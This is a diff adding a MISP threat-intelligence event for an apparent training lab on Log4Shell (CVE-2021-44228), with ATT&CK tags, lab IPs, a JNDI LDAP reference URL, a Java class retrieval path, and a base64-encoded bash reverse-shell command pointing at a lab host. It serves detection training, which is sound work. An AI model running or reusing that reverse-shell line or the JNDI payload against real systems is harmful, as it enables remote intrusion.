+          {
+            "name": "pap:green"
+          },
+          {
+            "name": "workflow:state=\"training-simulation\""
+          },
+          {
+            "name": "course:ignitecyber-academy"
+          },
+          {
+            "name": "victim:apexfin-solutions"
+          },
+          {
+            "name": "threat-actor:cinder-jackal"
+          },
+          {
+            "name": "training:data-only"
+          },
+          {
+            "name": "lab:LAB-3.4"
+          },
+          {
+            "name": "case:CJ-010B"
+          },
+          {
+            "name": "day:day-3-optional"
+          },
+          {
+            "name": "attack:technique=\"T1190\""
+          },
+          {
+            "name": "misp-galaxy:mitre-attack-pattern=\"Exploit Public-Facing Application - T1190\""
+          },
+          {
+            "name": "attack:technique=\"T1059.004\""
+          },
+          {
+            "name": "misp-galaxy:mitre-attack-pattern=\"Unix Shell - T1059.004\""
+          },
+          {
+            "name": "attack:technique=\"T1105\""
+          },
+          {
+            "name": "misp-galaxy:mitre-attack-pattern=\"Ingress Tool Transfer - T1105\""
+          }
+        ],
+        "Attribute": [
+          {
+            "uuid": "77d20e9b-46e7-5444-b695-c53831f48879",
+            "type": "text",
+            "category": "Other",
+            "value": "case_id=CJ-010B",
+            "to_ids": false,
+            "comment": "TheHive/MISP case alignment key.",
+            "distribution": "0",
+            "disable_correlation": false,
+            "first_seen": "2025-08-14",
+            "Tag": [
+              {
+                "name": "context:case-id"
+              }
+            ]
+          },
+          {
+            "uuid": "b77a57c9-89ba-510d-a08f-3ecf8935647e",
+            "type": "text",
+            "category": "Other",
+            "value": "notebook=PCAP/SecurityEvent optional evidence",
+            "to_ids": false,
+            "comment": "Notebook or source artifact aligned to this MISP event.",
+            "distribution": "0",
+            "disable_correlation": false,
+            "first_seen": "2025-08-14",
+            "Tag": [
+              {
+                "name": "context:notebook"
+              }
+            ]
+          },
+          {
+            "uuid": "4c330ad2-80c1-5df1-8c25-a20b4a5cae6c",
+            "type": "text",
+            "category": "Other",
+            "value": "source_file=pcap_log4shell_cve2021_44228_jndi_reference_2022-05-11181020.pcap",
+            "to_ids": false,
+            "comment": "Telemetry/evidence source used to seed this CTI event.",
+            "distribution": "0",
+            "disable_correlation": false,
+            "first_seen": "2025-08-14",
+            "Tag": [
+              {
+                "name": "context:source-file"
+              }
+            ]
+          },
+          {
+            "uuid": "7f6b83e3-93d5-548e-87ff-6a51796fd40f",
+            "type": "text",
+            "category": "Other",
+            "value": "source_file=securityauditing_log4shell_cve2021_44228_java_serialized_object_2022-05-13045400.json",
+            "to_ids": false,
+            "comment": "Telemetry/evidence source used to seed this CTI event.",
+            "distribution": "0",
+            "disable_correlation": false,
+            "first_seen": "2025-08-14",
+            "Tag": [
+              {
+                "name": "context:source-file"
+              }
+            ]
+          },
+          {
+            "uuid": "894abcc7-007c-5e24-a282-08035518e29b",
+            "type": "url",
+            "category": "Network activity",
+            "value": "ldap://192.168.2.6:1389/o=reference",
+            "to_ids": true,
+            "comment": "JNDI LDAP reference observed in User-Agent string from PCAP.",
+            "distribution": "0",
+            "disable_correlation": false,
+            "first_seen": "2025-08-14",
+            "Tag": [
+              {
+                "name": "source:exploit-indicator"
+              },
+              {
+                "name": "lab:LAB-3.4"
+              }
+            ]
+          },
+          {
+            "uuid": "85a049ba-4970-5a11-80d4-4e572b93aee1",
+            "type": "url",
+            "category": "Network activity",
+            "value": "http://192.168.2.6:8888/",
+            "to_ids": true,
+            "comment": "Remote Java class codebase observed in PCAP.",
+            "distribution": "0",
+            "disable_correlation": false,
+            "first_seen": "2025-08-14",
+            "Tag": [
+              {
+                "name": "source:exploit-infrastructure"
+              },
+              {
+                "name": "lab:LAB-3.4"
+              }
+            ]
+          },
+          {
+            "uuid": "1e26eaed-6257-5bd5-8454-6833a748a794",
+            "type": "uri",
+            "category": "Network activity",
+            "value": "/Log4j-2.14.0-SNAPSHOT/api",
+            "to_ids": false,
+            "comment": "HTTP endpoint targeted in Log4Shell request.",
+            "distribution": "0",
+            "disable_correlation": false,
+            "first_seen": "2025-08-14",
+            "Tag": [
+              {
+                "name": "source:victim-endpoint"
+              },
+              {
+                "name": "lab:LAB-3.4"
+              }
+            ]
+          },
+          {
+            "uuid": "82525848-3ada-580d-84c0-8792c8c6da86",
+            "type": "uri",
+            "category": "Network activity",
+            "value": "/xExportObject.class",
+            "to_ids": true,
+            "comment": "Java class retrieved during JNDI exploitation.",
+            "distribution": "0",
+            "disable_correlation": false,
+            "first_seen": "2025-08-14",
+            "Tag": [
+              {
+                "name": "source:payload-retrieval-path"
+              },
+              {
+                "name": "lab:LAB-3.4"
+              }
+            ]
+          },
+          {
+            "uuid": "4062b60c-2fd1-5ffe-a122-73cbb792aa89",
+            "type": "ip-src",
+            "category": "Network activity",
+            "value": "192.168.3.5",
+            "to_ids": false,
+            "comment": "Source address observed initiating connection to Tomcat service in SecurityEvent data.",
+            "distribution": "0",
+            "disable_correlation": false,
+            "first_seen": "2025-08-14",
+            "Tag": [
+              {
+                "name": "source:lab-internal-ip"
+              },
+              {
+                "name": "lab:LAB-3.4"
+              }
+            ]
+          },
+          {
+            "uuid": "08345901-0904-5b12-8b1a-e7b9765c1d20",
+            "type": "ip-dst",
+            "category": "Network activity",
+            "value": "192.168.2.5",
+            "to_ids": false,
+            "comment": "Tomcat destination host observed in SecurityEvent data.",
+            "distribution": "0",
+            "disable_correlation": false,
+            "first_seen": "2025-08-14",
+            "Tag": [
+              {
+                "name": "source:lab-victim-ip"
+              },
+              {
+                "name": "lab:LAB-3.4"
+              }
+            ]
+          },
+          {
+            "uuid": "265027a6-8a70-5cc2-b7b8-2c2b80a70559",
+            "type": "ip-dst",
+            "category": "Network activity",
+            "value": "192.168.2.6",
+            "to_ids": false,
+            "comment": "LDAP/HTTP callback infrastructure IP observed in PCAP.",
+            "distribution": "0",
+            "disable_correlation": false,
+            "first_seen": "2025-08-14",
+            "Tag": [
+              {
+                "name": "source:lab-attacker-ip"
+              },
+              {
+                "name": "lab:LAB-3.4"
+              }
+            ]
+          },
+          {
+            "uuid": "d484c32d-1b37-5527-b034-04dfa936ea90",
+            "type": "command-line",
+            "category": "External analysis",
+            "value": "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIuNi80NDMgMD4mMQo=}|{base64,-d}|{bash,-i}",
+            "to_ids": true,
+            "comment": "Decoded reverse-shell payload carrier observed in PCAP strings.",
+            "distribution": "0",
+            "disable_correlation": false,
+            "first_seen": "2025-08-14",
+            "Tag": [
+              {
+                "name": "source:exploit-behavior"
+              },
+              {
+                "name": "lab:LAB-3.4"
+              }
+            ]
+          }
+        ],
+        "EventReport": [
+          {
+            "uuid": "ca11de15-1746-5f95-9756-7b2f2a44293e",
+            "name": "LAB-3.4 CTI Event Report",
+            "content": "# LAB-3.4 \u2014 Log4Shell JNDI Reference Traffic\n\n**Case:** CJ-010B  \n**Campaign:** Cinder Jackal vs ApexFin Solutions  \n**Date:** 2025-08-14  \n**ATT&CK:** T1190, T1059.004, T1105\n\n## Analyst narrative\nOptional network exploit evidence demonstrates a Log4Shell/JNDI request, LDAP reference, HTTP class retrieval, and reverse-shell style payload in a safe lab.\n\n## CTI promotion guidance\n- Promote only validated observables from TheHive/Cortex into this MISP event.\n- Keep `to_ids=false` for baseline infrastructure, documentation ranges, internal IPs, and workflow metadata.\n- Keep `to_ids=true` for behaviorally useful detection indicators such as malicious command lines, staged payload names, suspicious URLs, named pipes, and fictional campaign IOCs.\n- Add sightings during the lab when the same observable appears in Elastic/Wazuh/Zeek queries.\n\n## Source artifacts\n- pcap_log4shell_cve2021_44228_jndi_reference_2022-05-11181020.pcap\n- securityauditing_log4shell_cve2021_44228_java_serialized_object_2022-05-13045400.json\n",
+            "distribution": "0",
+            "deleted": false
+          }
+        ]
+      }
+    }
+  ]
+}
